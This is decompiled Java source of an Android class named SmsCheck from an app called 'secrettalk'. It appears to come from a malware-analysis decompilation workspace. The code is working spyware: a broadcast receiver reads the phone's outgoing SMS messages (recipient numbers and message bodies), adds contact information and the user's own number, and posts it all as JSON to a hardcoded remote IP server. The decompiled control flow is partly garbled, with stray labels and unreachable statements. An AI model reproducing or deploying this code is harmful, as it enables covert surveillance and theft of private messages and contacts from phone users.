package com.android.secrettalk;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.util.Log;
import com.google.gson.JsonObject;
import java.net.URI;
import java.net.URLEncoder;

public class SmsCheck
  extends BroadcastReceiver
{
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    Log.w("outgoing sms", "start");
    new OutgoingSmsLogger(paramContext).execute(new Void[0]);
  }
  
  public class OutgoingSmsLogger
    extends AsyncTask<Void, Void, Void>
  {
    private static final String CONDITIONS = "type = 2 AND date > ";
    private static final String ORDER = "date DESC";
    private final String[] COLUMNS;
    private final Uri SMS_URI = Uri.parse("content://sms");
    private Cursor cursor;
    private Context mContext;
    private SharedPreferences prefs;
    private long timeLastChecked;
    
    public OutgoingSmsLogger(Context paramContext)
    {
      String[] arrayOfString = new String[4];
      arrayOfString[0] = "date";
      arrayOfString[1] = "address";
      arrayOfString[2] = "body";
      arrayOfString[3] = "type";
      this.COLUMNS = arrayOfString;
      this.prefs = paramContext.getSharedPreferences("secretTalkApp", 0);
      this.mContext = paramContext;
    }
    
    protected Void doInBackground(Void... paramVarArgs)
    {
      this.timeLastChecked = this.prefs.getLong("time_last_checked", -1L);
      ContentResolver localContentResolver = this.mContext.getContentResolver();
      JsonObject localJsonObject = new JsonObject();
      this.cursor = localContentResolver.query(this.SMS_URI, this.COLUMNS, "type = 2 AND date > " + this.timeLastChecked, null, "date DESC");
      String str1;
      long l;
      String str2;
      String str3;
      String str4;
      if (this.cursor.moveToNext())
      {
        str1 = "" + "\n outgoing sms \n";
        this.timeLastChecked = this.cursor.getLong(this.cursor.getColumnIndex("date"));
        l = this.cursor.getLong(this.cursor.getColumnIndex("date"));
        str2 = this.cursor.getString(this.cursor.getColumnIndex("address"));
        str3 = this.cursor.getString(this.cursor.getColumnIndex("body"));
        str4 = l + "," + str2 + "," + str3;
        if (str1.contains(str4))
        {
          label243:
          if (this.cursor.moveToNext()) {
            break label583;
          }
          this.cursor.close();
          String str6 = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(str1)).append("\n Contact Info").toString())).append(ContactInfo.getContactInfo()).toString())).append("\n").toString() + ContactInfo.getMyPhoneNumber();
          SharedPreferences.Editor localEditor = this.prefs.edit();
          localEditor.putLong("time_last_checked", this.timeLastChecked);
          localEditor.commit();
          Log.w("outgoing sms", str6);
          Log.w("outgoing sms", "send gmail");
          HttpManager.postHttpResponse(URI.create("http://61.33.28.196/secrettalk.server/api/api.php?mName=smsInformation&format=json"), localJsonObject.toString());
        }
      }
      for (;;)
      {
        return null;
        String str5 = str1 + str4;
        localJsonObject.addProperty("call_pn", str2);
        localJsonObject.addProperty("type", Integer.valueOf(1));
        localJsonObject.addProperty("contents", URLEncoder.encode(str3));
        localJsonObject.addProperty("user_pn", GlobalData.my_phonenumber);
        localJsonObject.addProperty("cdate", Long.valueOf(System.currentTimeMillis() / 1000L));
        Log.d("Test", "date sent: " + l);
        Log.d("Test", "target number: " + str2);
        Log.d("Test", "number of characters: " + str3.length());
        str1 = str5 + "\n";
        break label243;
        label583:
        break;
        Log.w("outgoing sms", "there are nothing");
      }
    }
  }
}


/* Location:           D:\Workspaces\SsSDK\contest_dev\Manal\Manal-plugin\tools\decompiler\tools\classes-dex2jar.jar
 * Qualified Name:     com.android.secrettalk.SmsCheck
 * JD-Core Version:    0.7.0.1
 */